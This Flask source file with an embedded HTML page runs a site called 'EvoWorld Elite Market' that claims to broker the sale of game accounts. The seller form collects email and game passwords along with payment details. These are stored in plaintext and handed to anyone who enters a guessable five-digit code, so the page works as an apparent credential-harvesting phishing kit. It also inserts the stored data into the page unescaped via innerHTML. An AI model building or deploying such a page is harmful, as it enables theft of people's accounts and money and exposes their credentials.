from flask import Flask, request, jsonify, render_template_string
import os
import psycopg2
import random

app = Flask(__name__)

# بيانات قاعدة البيانات من Render (هتضاف تلقائي)
DATABASE_URL = os.environ.get('DATABASE_URL')

conn = psycopg2.connect(DATABASE_URL, sslmode='require')
cur = conn.cursor()

cur.execute('''
CREATE TABLE IF NOT EXISTS accounts (
    id SERIAL PRIMARY KEY,
    code VARCHAR(5) UNIQUE NOT NULL,
    email VARCHAR(255),
    password VARCHAR(255),
    username VARCHAR(255),
    game_password VARCHAR(255),
    payment_method VARCHAR(100),
    payment_details TEXT,
    price DECIMAL(10,2)
);
''')
conn.commit()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EvoWorld Elite Market - Since 2019</title>
    <style>
        body { font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #1e3c72, #2a5298); margin: 0; color: #fff; }
        .container { max-width: 900px; margin: 40px auto; background: rgba(255,255,255,0.1); border-radius: 25px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.4); }
        .header { background: linear-gradient(to right, #ff6b6b, #feca57); padding: 60px; text-align: center; }
        .header h1 { font-size: 48px; margin: 0; text-shadow: 3px 3px 10px rgba(0,0,0,0.5); }
        .header p { font-size: 22px; margin: 10px 0; }
        .page { display: none; padding: 50px; text-align: center; }
        .active { display: block; }
        input, select { width: 80%; max-width: 500px; padding: 20px; margin: 20px auto; display: block; border-radius: 15px; border: none; font-size: 18px; background: rgba(255,255,255,0.2); color: white; }
        input::placeholder { color: #ddd; }
        .btn { padding: 20px 40px; background: linear-gradient(to right, #ff6b6b, #feca57); color: white; border: none; border-radius: 50px; font-size: 20px; cursor: pointer; margin: 30px; transition: 0.3s; }
        .btn:hover { transform: scale(1.1); box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
        .or { font-size: 24px; margin: 30px; color: #feca57; }
        .note { background: rgba(255,255,0,0.1); padding: 20px; border-radius: 15px; margin: 30px auto; max-width: 600px; font-size: 16px; }
        .ip-box { background: linear-gradient(to right, #ff6b6b, #feca57); padding: 50px; font-size: 60px; font-weight: bold; border-radius: 20px; margin: 40px auto; max-width: 500px; letter-spacing: 15px; }
        .options { display: flex; justify-content: center; gap: 50px; flex-wrap: wrap; }
        .option { background: rgba(255,255,255,0.1); padding: 50px; border-radius: 20px; width: 300px; cursor: pointer; transition: 0.4s; }
        .option:hover { background: rgba(255,255,255,0.2); transform: translateY(-20px); }
        .option h2 { font-size: 30px; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
<div class="container">
    <div class="header">
        <h1>EvoWorld Elite Market</h1>
        <p>Premium Accounts Trading - Trusted Since 2019</p>
    </div>

    <div id="main" class="page active">
        <div class="options">
            <div class="option" onclick="showPage('sell')">
                <h2>Sell Account</h2>
                <p>List your premium account</p>
            </div>
            <div class="option" onclick="showPage('buy')">
                <h2>Buy Account</h2>
                <p>Get the best deals</p>
            </div>
        </div>
    </div>

    <div id="sell" class="page">
        <h2>Sell Your Account</h2>
        <input type="email" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <div class="or">OR</div>
        <input type="text" id="username" placeholder="In-Game Username">
        <input type="password" id="game_password" placeholder="In-Game Password">
        <div class="note">Using username + password? Funds released after 61 days for security.</div>
        <button class="btn" onclick="showPage('payment')">Next</button>
    </div>

    <div id="payment" class="page">
        <h2>Payment Method</h2>
        <select id="method">
            <option value="">Select Method</option>
            <option>PayPal</option>
            <option>Vodafone Cash</option>
            <option>Fawry</option>
            <option>Etisalat Cash</option>
            <option>Orange Cash</option>
            <option>Bitcoin</option>
            <option>USDT</option>
            <option>Binance Pay</option>
            <option>Perfect Money</option>
            <option>Skrill</option>
            <option>Wise</option>
            <option>Bank Transfer</option>
        </select>
        <input type="text" id="details" placeholder="Your payment info">
        <button class="btn" onclick="showPage('price')">Next</button>
    </div>

    <div id="price" class="page">
        <h2>Set Your Price</h2>
        <input type="number" id="amount" placeholder="850">
        <p>EGP</p>
        <button class="btn" onclick="finishSell()">Generate Code</button>
    </div>

    <div id="success" class="page">
        <h2>Listed Successfully!</h2>
        <p>The amount will be transferred within 24 hours after sale.</p>
        <h2>Your Code</h2>
        <div class="ip-box" id="code_display"></div>
        <button class="btn" onclick="location.reload()">Sell Another</button>
    </div>

    <div id="buy" class="page">
        <h2>Enter Code</h2>
        <input type="text" id="buy_code" maxlength="5" placeholder="xxxxx">
        <button class="btn" onclick="loadAccount()">View</button>
    </div>

    <div id="view" class="page">
        <h2>Account Details</h2>
        <div style="background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;" id="account_details"></div>
        <button class="btn" onclick="showPage('main')">Home</button>
    </div>
</div>

<script>
function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

async function finishSell() {
    const data = {
        email: document.getElementById('email').value.trim(),
        password: document.getElementById('password').value,
        username: document.getElementById('username').value.trim(),
        game_password: document.getElementById('game_password').value,
        payment_method: document.getElementById('method').value,
        payment_details: document.getElementById('details').value.trim(),
        price: document.getElementById('amount').value
    };

    if ((!data.email || !data.password) && (!data.username || !data.game_password)) return alert('Fill required');
    if (!data.payment_method || !data.payment_details || !data.price) return alert('Fill all');

    const res = await fetch('/save', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
    const json = await res.json();
    if (json.code) {
        document.getElementById('code_display').textContent = json.code;
        showPage('success');
    } else {
        alert('Error');
    }
}

async function loadAccount() {
    const code = document.getElementById('buy_code').value.trim();
    if (code.length !== 5) return alert('5 digits');

    const res = await fetch(`/load?code=${code}`);
    const data = await res.json();
    if (data.error) {
        alert('Invalid code');
    } else {
        document.getElementById('account_details').innerHTML = `
            Email: ${data.email || 'N/A'}<br>
            Password: ${data.password || 'N/A'}<br>
            Username: ${data.username || 'N/A'}<br>
            Game Password: ${data.game_password || 'N/A'}<br>
            Price: ${data.price} EGP<br>
            Payment: ${data.payment_method} - ${data.payment_details}
        `;
        showPage('view');
    }
}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    code = str(random.randint(10000, 99999))
    
    cur.execute("""
        INSERT INTO accounts (code, email, password, username, game_password, payment_method, payment_details, price)
        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
    """, (code, data.get('email'), data.get('password'), data.get('username'), data.get('game_password'), data.get('payment_method'), data.get('payment_details'), data.get('price')))
    conn.commit()
    
    return jsonify({'code': code})

@app.route('/load')
def load():
    code = request.args.get('code')
    cur.execute("SELECT * FROM accounts WHERE code = %s", (code,))
    acc = cur.fetchone()
    if acc:
        return jsonify({
            'email': acc[2],
            'password': acc[3],
            'username': acc[4],
            'game_password': acc[5],
            'payment_method': acc[6],
            'payment_details': acc[7],
            'price': acc[8]
        })
    return jsonify({'error': 'not found'})

if __name__ == '__main__':
    app.run()
